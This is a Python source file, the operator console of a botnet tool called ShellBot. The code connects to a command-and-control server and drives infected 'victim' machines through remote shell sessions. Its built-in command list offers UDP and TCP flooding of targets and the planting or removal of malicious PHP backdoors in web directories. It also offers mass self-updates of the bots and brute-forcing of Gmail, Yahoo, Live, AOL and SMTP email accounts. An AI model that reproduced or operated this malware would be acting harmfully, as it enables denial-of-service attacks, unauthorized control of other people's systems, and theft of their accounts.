#!/usr/bin/env python3

## MIT License
##
## Copyright (c) 2017 Sayak Brahmachari
##
## Permission is hereby granted, free of charge, to any person obtaining a copy
## of this software and associated documentation files (the "Software"), to
## deal in the Software without restriction, including without limitation the
## rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
## sell copies of the Software, and to permit persons to whom the Software is
## furnished to do so, subject to the following conditions:
##
## The above copyright notice and this permission notice shall be included in
## all copies or substantial portions of the Software.
##
## THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
## IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
## FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
## AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
## LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
## FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
## IN THE SOFTWARE.

import os
import sys
import socket
import re
import threading

intro = r"""
 ____ ____ ____ ____ ____ ____ ____ ____
||S |||h |||e |||l |||l |||B |||o |||t ||
||__|||__|||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|  

Coded by: Sayak Brahmachari
GitHub: https://github.com/sayak-brm
Website: http://mctrl.ml
"""

commands = """

Primary:
--------
accept                  | Accept connections
list                    | List connections
clear                   | Clear the console
quit                    | Close all connections and quit
credits                 | Show Credits
help                    | Show this message

Client Interaction:
-------------------
interact <id>           | Interact with client
rawexec                 | Execute a binary and pipe the raw I/O to the controller
stop                    | Stop interacting with client
udpflood <ip>:<port>    | UDP flood with client
tcpflood <ip>:<port>    | TCP flood with client
setbackdoor <web dir>   | Infects all PHP Pages with Malicious Code that will
                          run the ShellBot Client (if killed) again.
rmbackdoor <web dir>    | Removes the Malicious PHP Code
  Note: Commands sent to clients must not contain semi-colons (;) wxcept when
  combining multiple lines.

Wide Commands:
--------------
udpfloodall <ip>:<port> | Same as `udpflood` but for All clients
tcpfloodall <ip>:<port> | Same as `tcpflood` but for All clients
selfupdateall           | Update all Clients with the new version from Github

Bruteforce:
-----------
gmailbruteforce <email>:<keys>:<min>:<max>
yahoobruteforce <email>:<keys>:<min>:<max>
livebruteforce <email>:<keys>:<min>:<max>
aolbruteforce <email>:<keys>:<min>:<max>
  Example: gmailbruteforce someone@gmail.com:0123456789:6:8
custombruteforce <address>:<port>:<email>:<keys>:<min>:<max>
  Example: custombruteforce smtp.example.com:587:user@example.com:abcdefghi:4:6

\n"""

if len(sys.argv) == 4:
    host = sys.argv[1]
    port = int(sys.argv[2])
    password = sys.argv[3]
else:
    #sys.exit("Usage: client.py <server ip> <server bridge port> <password>")
    print("Usage: client.py <server ip> <server bridge port> <password>")
    host = '127.0.0.1'
    port = 9090
    password = '1234'
    print("Using default values - {}:{}, password:{}".format(host, port, password))

def send_msg(sock, sem):
    while True:
        data = sys.stdin.readline()
        if sem.acquire(False):
            return
        sock.send(bytes(data, 'utf-8'))

def recv_msg(sock):
    while True:
        data = sock.recv(20480).decode()
        if data == 'stop': return
        sys.stdout.write(data)

def main():
    print(intro)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
    except Exception:
        sys.exit("[ERROR] Can't connect to server")

    s.send(bytes(password, 'utf-8'))

    while 1:
        command = input("SB> ")
        try:
            if command == "accept":
                s.send(bytes("accept", 'utf-8'))
                print(s.recv(20480).decode())
            elif command == "list":
                s.send(bytes("list", 'utf-8'))
                print(s.recv(20480).decode())
            elif "interact " in command:
                s.send(bytes(command, 'utf-8'))
                temporary = s.recv(20480).decode()
                if "ERROR" not in temporary:
                    victimpath = s.recv(20480).decode()
                    if "ERROR" not in victimpath:
                        breakit = False
                        while not breakit:
                            msg = input(victimpath)
                            allofem = re.split(''';(?=(?:[^'"]|'[^']*'|"[^"]*")*$)''', msg)
                            for onebyone in allofem:
                                if onebyone == "stop":
                                    s.send(bytes("stop", 'utf-8'))
                                    print("\n")
                                    breakit = True
                                elif "rawexec" in onebyone:
                                    sem = threading.Semaphore()
                                    sem.acquire(False)
                                    s.send(bytes(onebyone, 'utf-8'))
                                    sender = threading.Thread(target=send_msg, args=(s, sem,))
                                    recver = threading.Thread(target=recv_msg, args=(s,))
                                    sender.daemon = True
                                    recver.daemon = True
                                    sender.start()
                                    recver.start()
                                    while threading.active_count() > 2:
                                        pass
                                    sem.release()
                                elif "cd " in onebyone:
                                    s.send(bytes(onebyone, 'utf-8'))
                                    temp = s.recv(20480).decode()
                                    if "ERROR" not in temp:
                                        victimpath = temp
                                    else: print(temp)
                                elif onebyone == "":
                                    print("[CONTROLLER] Nothing to be sent...\n")
                                else:
                                    s.send(bytes(onebyone, 'utf-8'))
                                    print(s.recv(20480).decode())
                    else:
                        print(victimpath)
                        break
                else:
                    print(temporary)
            elif "udpfloodall " in command or "tcpfloodall " in command:
                s.send(bytes(command, 'utf-8'))
                print("\n")
            elif command == "selfupdateall":
                s.send(bytes("selfupdateall", 'utf-8'))
                print("\n")
            elif command == "clear":
                if sys.platform == 'win32':
                    os.system("cls")
                else:
                    os.system("clear")
            elif command == "quit":
                s.send(bytes("quit", 'utf-8'))
                s.close()
                break
            elif command == "help":
                print(commands)
            elif command == "credits":
                print(r"""
 ____ ____ ____ ____ ____ ____ ____ ____
||S |||h |||e |||l |||l |||B |||o |||t ||
||__|||__|||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|

Coded by: Sayak Brahmachari
GitHub: https://github.com/sayak-brm
Website: http://mctrl.ml
""")
            else:
                print("[CONTROLLER] Invalid Command\n")
        except KeyboardInterrupt:
            try:
                s.send(bytes("quit", 'utf-8'))
                s.close()
                print("")
                break
            except Exception:
                pass
        except Exception as ex:
            print("[CONTROLLER] Connection Closed Due to Error:", ex)
            s.close()
            break

main()
